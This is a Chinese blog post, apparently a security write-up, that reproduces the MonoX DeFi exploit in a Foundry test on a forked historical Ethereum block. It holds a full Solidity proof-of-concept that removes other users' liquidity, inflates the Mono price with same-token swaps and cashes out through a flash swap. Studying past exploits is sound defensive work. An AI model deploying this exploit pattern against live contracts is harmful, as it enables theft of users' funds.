---
title: Defi安全-Monox攻击事件Foundry复现
date: 2024-01-07 21:10:00
tags: [区块链安全, 安全事件分析]
categories:
  - [Defi安全]
  - [安全事件分析]
description: 摘要：Defi安全--Monox攻击事件Foundry复现
---

Mono攻击事件的介绍见：[Defi安全--Monox攻击事件分析--phalcon+etherscan](https://emmanuelwh.github.io/2023/12/23/Defi安全-Monox攻击事件分析/)

## 1. 前情提要和思路介绍

Monox使用单边池模型，创建的是代币-vCash交易对，添加流动性时，只需添加代币，即可进行任意代币的兑换

主要的漏洞有两个方面：

- 可以在Monox官网查看提供代币流动性的用户地址，但是每个用户的流动性，任意的用户都可以调用移除流动性函数，进行流动性的移除。
- 在Monoswap的代币交换函数中，并未考虑`tokenIn ` 和`tokenOut`相等的情况，代码逻辑处理的时候，出现价格覆盖的情况，Mono代币价格异常抬升，具体可见相关攻击实现的分析。

## 2. Foundry复现攻击流程

foundry进行外部合约调用的时候，用interface定义相应的方法，并定义对应合约的地址，实现外部合约的调用（觉得比较好的方式）

```solidity

pragma solidity >=0.7.0 <0.9.0;
import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function deposit() external payable;
}

interface IuniswapV2pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IMonoswap {
    function removeLiquidity (address _token, uint256 liquidity, address to,uint256 minVcashOut, uint256 minTokenOut) external returns(uint256 vcashOut, uint256 tokenOut);
    function addLiquidity(address _token, uint256 _amount, address to) external returns (uint256 liquidity);
    function swapExactTokenForToken(
        address tokenIn,
        address tokenOut,
        uint amountIn,
        uint amountOutMin,
        address to,
        uint deadline
    ) external returns (uint amountOut);
    function swapTokenForExactToken(
        address tokenIn,
        address tokenOut,
        uint256 amountInMax,
        uint256 amountOut,
        address to,
        uint256 deadline
    ) external returns (uint256 amountIn);
    function pools(address)
        external
        view
        returns (
            uint256 pid,
            uint256 lastPoolValue,
            address token,
            uint8 status,
            uint112 vcashDebt,
            uint112 vcashCredit,
            uint112 tokenBalance,
            uint256 price,
            uint256 createdAt
        );
}

interface IMonoXPool {
    function totalSupplyOf(uint256 pid) external returns (uint256);
    function balanceOf(address account, uint256 id) external returns (uint256);
}

address constant uniswapv2pair = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant Monoswap = 0xC36a7887786389405EA8DA0B87602Ae3902B88A1;
address constant MonoXPool = 0x59653E37F8c491C3Be36e5DD4D503Ca32B5ab2f4;
address constant Mono = 0x2920f7d6134f4669343e70122cA9b8f19Ef8fa5D;
address constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

address constant liquidity_user1 = 0x7B9aa6ED8B514C86bA819B99897b69b608293fFC;
address constant liquidity_user2 = 0x81D98c8fdA0410ee3e9D7586cB949cD19FA4cf38;
address constant liquidity_user3 = 0xab5167e8cC36A3a91Fd2d75C6147140cd1837355;
```

攻击代码

调用forge进行测试

```
 forge test --match-contract test_Monox -vv
```

结果：

![image-20240107221535861](https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401072215299.png)

```solidity
contract test_Monox is Test{

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/eth", 13_715_025);
    }
    //首先folk以太坊上对应区块的状态
    
    function test_Monox_exploit() public {
        IERC20(Mono).approve(address(Monoswap), type(uint256).max);
        IERC20(weth).deposit{value: address(this).balance, gas: 40_000}();

        console.log("WETH balance: ", IERC20(weth).balanceOf(address(this)));
        IERC20(weth).approve(address(Monoswap), 0.1 ether);
		//在进行对应的代币转移的时候，一定要记得先进行approve操作
		
        IMonoswap(Monoswap).swapExactTokenForToken(weth, Mono, 0.1 ether, 1, address(this), 1638278872);
        console.log("Mono balance:  ", IERC20(Mono).balanceOf(address(this)));
        //提取weth，并调用monoswap的函数，将0.1weth换成对应的Mono代币，易进行后续操作
        
        remove_liquidity_user();
        uint liquidity = IMonoswap(Monoswap).addLiquidity(address(Mono), 196975656, address(this));
        console.log("attacker gain liquidity: ", liquidity);
		//攻击者自己添加对应的流动性，获得对应LP流动性证明，为后续拉升Mono价格做准备
		
        raise_mono_price();

        swap_mono_for_weth();
        //将对应高价格的mono代币置换成weth

    }

    function remove_liquidity_user() public {
        
        (uint pid,,,,,,,,) = IMonoswap(Monoswap).pools(address(Mono));
        uint balance = IMonoXPool(MonoXPool).totalSupplyOf(pid);
        console.log("pid:  ", pid);
        console.log("monoXpool's mono balance: ", balance);

        uint balance1 = IMonoXPool(MonoXPool).balanceOf(address(liquidity_user1), pid);
        IMonoswap(Monoswap).removeLiquidity(address(Mono), balance1, address(liquidity_user1), 0, 1);

        uint balance2 = IMonoXPool(MonoXPool).balanceOf(address(liquidity_user2), pid);
        IMonoswap(Monoswap).removeLiquidity(address(Mono), balance2, address(liquidity_user2), 0, 1);

        uint balance3 = IMonoXPool(MonoXPool).balanceOf(address(liquidity_user3), pid);
        IMonoswap(Monoswap).removeLiquidity(address(Mono), balance3, address(liquidity_user3), 0, 1);
		//漏洞函数，根据phalcon的调用序列，移除对应用户的流动性
        uint balance_afterremove = IMonoXPool(MonoXPool).totalSupplyOf(pid);
        console.log("monoXpool's mono balance after remove liquidity", balance_afterremove);
    }

    function raise_mono_price() public {
        for(uint i = 0 ; i < 55 ; i++){
            (uint pid ,,,,,,uint tokenBalance,uint price, ) = IMonoswap(Monoswap).pools(address(Mono));
            uint balance = IERC20(Mono).balanceOf(address(this));

            IMonoswap(Monoswap).swapExactTokenForToken(address(Mono), address(Mono), tokenBalance ,0, address(this), 1638278872);

            console.log("Mono token Price - ",i,":  ",  price);
        }
        //按照对应的调用序列，得到池子里的Mono余额，并调用对应的漏洞函数，swapEaxctTokenForToken
    }

    function swap_mono_for_weth() public {
        
        uint weth_balance = IERC20(weth).balanceOf(address(this));
        console.log("attacker weth balance: ", weth_balance);

        uint mono_balance = IERC20(Mono).balanceOf(address(this));
        console.log("attacker mono balance: ", mono_balance);

        IuniswapV2pair(uniswapv2pair).swap(0, 547_206_697_433_507_365_949, address(this), "0x00");
        //闪电贷，借贷weth和usdc的pair对
        uint weth_balance2 = IERC20(weth).balanceOf(address(this));
        console.log("attacker weth balance: ", weth_balance2 - weth_balance);

        uint mono_balance2 = IERC20(Mono).balanceOf(address(this));
        console.log("attacker mono balance: ", mono_balance - mono_balance2);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public{

        uint balance = IERC20(Mono).balanceOf(address(this));
        IMonoswap(Monoswap).swapTokenForExactToken(address(Mono), address(usdc), balance, 4029106880396, address(this), 1638278872);

        bool success = IERC20(usdc).transfer(address(uniswapv2pair),3029106880396);

        require(success);
        //在回调函数中，调用monoswap对应的函数，将mono换成对应的usdc，实现对应的usdc还款。

    }

    function onERC1155Received(address _operator, address _from, uint256 _id, uint256 _value, bytes calldata _data) external returns(bytes4){
        bytes4 a = bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"));
        // a = 0xf23a6e61
        return a;
    }
    //在添加流动性的时候，会回调对应的函数，否则会报错
}
```

攻击poc如果没有定义相应的的onERC1155Received，则在流动性生成时会报错，如下图所示：

![image-20240107221633674](https://gitee.com/Emmanuel_scb/blogimage/raw/master/img/202401072216331.png)
